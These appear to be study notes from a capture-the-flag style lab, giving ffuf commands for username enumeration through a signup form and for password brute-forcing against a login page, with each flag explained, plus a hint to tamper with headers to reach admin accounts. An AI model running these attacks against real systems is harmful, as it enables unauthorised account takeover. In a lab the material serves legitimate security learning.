Username Enumeration:

  ffuf -w /usr/share/wordlists/SecLists/Usernames/Names/names.txt
       -X POST
       -d "username=FUZZ&email=x&password=x&cpassword=x"
       -H "Content-Type: application/x-www-form-urlencoded"
       -u http://MACHINE_IP/customers/signup
       -mr "username already exists"

  -w ----> selects the file's location on the computer that contains the list of usernames that we're going to check exists
  -X ----> specifies the request method, this will be a GET request by default, but it is a POST request in our example.
  -d ----> specifies the data that we are going to send. In our example, we have the fields username, email, password and cpassword.
           We've set the value of the username to FUZZ. In the ffuf tool, the FUZZ keyword signifies where the contents from our wordlist will be inserted in the request.
  -H ----> is used for adding additional headers to the request. In this instance, we're setting the Content-Type to the webserver knows we are sending form data.
  -u ----> specifies the URL we are making the request to.
  -mr----> is the text on the page we are looking for to validate we've found a valid username
  
  The ffuf tool and wordlist come pre-installed on the AttackBox or can be installed locally by downloading it from https://github.com/ffuf/ffuf.

Brute Force:
  
  ffuf -w valid_usernames.txt:W1,/usr/share/wordlists/SecLists/Passwords/Common-Credentials/10-million-password-list-top-100.txt:W2
       -X POST 
       -d "username=W1&password=W2"
       -H "Content-Type: application/x-www-form-urlencoded"
       -u http://MACHINE_IP/customers/login 
       -fc 200
  
  -fc ------> check for an HTTP status code other than 200.

Furthermore: 

  Use curl to connect to http and change the -H name, to try to be able to access admin accounts, etc.
